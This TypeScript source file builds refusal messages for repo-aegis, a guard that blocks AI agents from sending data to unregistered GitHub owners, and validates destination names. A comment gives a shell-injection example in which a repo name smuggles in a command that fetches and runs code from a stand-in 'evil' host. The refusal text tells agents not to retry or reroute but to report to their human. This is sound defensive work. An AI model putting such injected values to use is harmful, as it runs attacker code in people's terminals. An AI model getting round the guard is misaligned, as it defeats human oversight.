// SPDX-License-Identifier: GPL-3.0-or-later
// Copyright (C) 2026 Richard Myers and contributors.
//
// The shared refusal builder (doc/plan-unregistered-owner-egress.md §3.9).
//
// A refusal is the only thing an agent and its human ever see of the guard.
// A vague one teaches both to work around it. So every refusal built here
// answers five questions, in this order:
//
//   1. WHAT was refused: the verb and the destination.
//   2. WHY, in one plain sentence that names the rule's idea, not its letter.
//   3. Does an APPROVAL help? Said either way.
//   4. The FIX, and WHO runs it: a person from a terminal, or the agent
//      re-issuing the command. An agent must be able to tell from the text
//      alone that it may not run a person's step itself.
//   5. WHERE to read more: the code and `doc/agent-guide.md#<code>`.
//
// One builder, so the agent hook, the `gh` shim and the pre-push hook cannot
// drift apart in wording.
//
// Callers pass only what the command already says (the verb, the destination
// owner/repo). Never registry contents, other owners, engagement ids, payload
// bytes or matched strings: the reason can land in an agent transcript.

/** One remedy, and who carries it out. */
export interface RefusalFix {
  /**
   * `person`: must be run by a human at a terminal; an agent must not run it.
   * `agent`: the agent re-issues its own command in this shape.
   */
  by: "person" | "agent";
  /**
   * The exact command (or, for `agent`, the shape to re-issue as). May be
   * omitted for a `person` step that is simply "run the original command
   * yourself".
   */
  command?: string;
  /** Leading condition, e.g. `If "acme" is yours`. Rendered as `<when>, a person runs…`. */
  when?: string;
  /** Short trailing remark, rendered in parentheses. */
  note?: string;
  /**
   * A person's step that is not a shell command (e.g. repair a file). Rendered
   * `<A person|when, a person> <step>.` and used instead of `command`.
   */
  step?: string;
}

// ---------------------------------------------------------------------------
// Destination names are untrusted
// ---------------------------------------------------------------------------
//
// The owner and repo in a refusal come from the agent's own command line.
// Refusal text routinely tells a person to paste a command (`repo-aegis
// engagements add --personal-org <owner>`, `repo-aegis approve <owner>/<repo>`),
// so an unvalidated name is a shell-injection vector into the human's terminal:
// `gh issue create --repo 'x$(curl evil|sh)/r'`. A name is therefore only ever
// interpolated after passing {@link safeDestination}.
//
// The test runs on the ORIGINAL string, ASCII only, and lower-cases afterwards.
// Lower-casing first would turn U+212A (KELVIN SIGN) into a plain `k`.

/** GitHub owner: alphanumerics and hyphens, at most 39 characters. */
const SAFE_OWNER = /^[A-Za-z0-9][A-Za-z0-9-]{0,38}$/;
/** GitHub repo: alphanumerics, `.`, `_`, `-`, at most 100 characters. */
const SAFE_REPO = /^[A-Za-z0-9._-]{1,100}$/;

/**
 * The destination as safe, lower-cased `org`/`repo` strings, or `null` when
 * either half is not a plausible GitHub name. A repo of exactly `*` (an
 * org-level destination) is accepted; `.` and `..` are not.
 */
export function safeDestination(org: string, repo: string): { org: string; repo: string } | null {
  if (!SAFE_OWNER.test(org)) return null;
  if (repo !== "*" && (!SAFE_REPO.test(repo) || repo === "." || repo === "..")) return null;
  return { org: org.toLowerCase(), repo: repo.toLowerCase() };
}

/** Whether one owner name is a plausible GitHub owner (same rule as {@link safeDestination}). */
export function isSafeOwner(org: string): boolean {
  return SAFE_OWNER.test(org);
}

/**
 * Whether `d` may be PRINTED or attached to a decision that a layer prints as
 * JSON: an unresolved destination (`org`/`repo` are `*`) always may; a named
 * one only if its name passes {@link safeDestination}. Keeps shell syntax,
 * line breaks and bidirectional-control characters (U+202E) out of terminals.
 */
export function isPrintableDestination(d: { org: string; repo: string; unresolved?: string }): boolean {
  return d.unresolved !== undefined || safeDestination(d.org, d.repo) !== null;
}

/** What stands in for a destination whose name failed {@link safeDestination}. */
export const INVALID_DESTINATION_LABEL = "a destination with an invalid owner/repo name";

export interface RefusalInput {
  /** The refusal code, e.g. `UNREGISTERED_OWNER_EGRESS`. */
  code: string;
  /**
   * The destination this refusal is about, with the verb label. When given and
   * the name fails {@link safeDestination}, `what`, `why` and `fixes` are
   * DISCARDED and a generic refusal is built that carries neither the name nor
   * any command. Callers that interpolate a destination into text must pass it
   * here, so every rule gets the protection.
   */
  destination?: { verb: string; org: string; repo: string };
  /** What was refused, e.g. `gh issue create → stranger/repo`. */
  what: string;
  /** Why, in one self-sufficient sentence. Some hosts truncate the reason. */
  why: string;
  /** Whether an approval helps, as a sentence (`No approval covers this.` or the one that would). */
  approval: string;
  /** The remedies, each marked as a person's step or an agent re-issue. */
  fixes: readonly RefusalFix[];
}

function sentence(text: string): string {
  const t = text.trim();
  return /[.!?]$/.test(t) ? t : `${t}.`;
}

function renderFix(fix: RefusalFix): string {
  const note = fix.note !== undefined ? ` (${fix.note})` : "";
  if (fix.by === "person") {
    if (fix.step !== undefined) {
      return `${fix.when !== undefined ? `${fix.when}, a person` : "A person"} ${fix.step}${note}.`;
    }
    const lead = fix.when !== undefined ? `${fix.when}, a person runs` : "A person runs";
    return fix.command !== undefined
      ? `${lead}, from a terminal: ${fix.command}${note}.`
      : `${lead} the original command, from a terminal${note}.`;
  }
  const lead = fix.when !== undefined ? `${fix.when}, re-issue as` : "Re-issue as";
  return `${lead}: ${fix.command ?? "(no command given)"}${note}.`;
}

/** Where `doc/agent-guide.md` documents a code. */
export function agentGuideAnchor(code: string): string {
  return `doc/agent-guide.md#${code.toLowerCase()}`;
}

/**
 * Build the five-part refusal text:
 * `<what>: refused. <why> <approval> <fixes…> [<code>, see doc/agent-guide.md#<code>]`.
 */
export function refusal(input: RefusalInput): string {
  if (input.destination !== undefined && safeDestination(input.destination.org, input.destination.repo) === null) {
    return [
      `${input.destination.verb}: refused.`,
      "The destination name is not a valid GitHub owner/repo, so repo-aegis cannot check, register or approve it.",
      "No approval covers this.",
      "Re-issue the command naming a valid <owner>/<repo>.",
      `[${input.code}, see ${agentGuideAnchor(input.code)}]`,
    ].join(" ");
  }
  const parts = [`${input.what}: refused.`, sentence(input.why), sentence(input.approval)];
  for (const fix of input.fixes) parts.push(renderFix(fix));
  if (input.fixes.some(f => f.by === "person")) {
    parts.push("Agents: do not run that yourself, retry or reroute; report this to your human.");
  }
  parts.push(`[${input.code}, see ${agentGuideAnchor(input.code)}]`);
  return parts.join(" ");
}
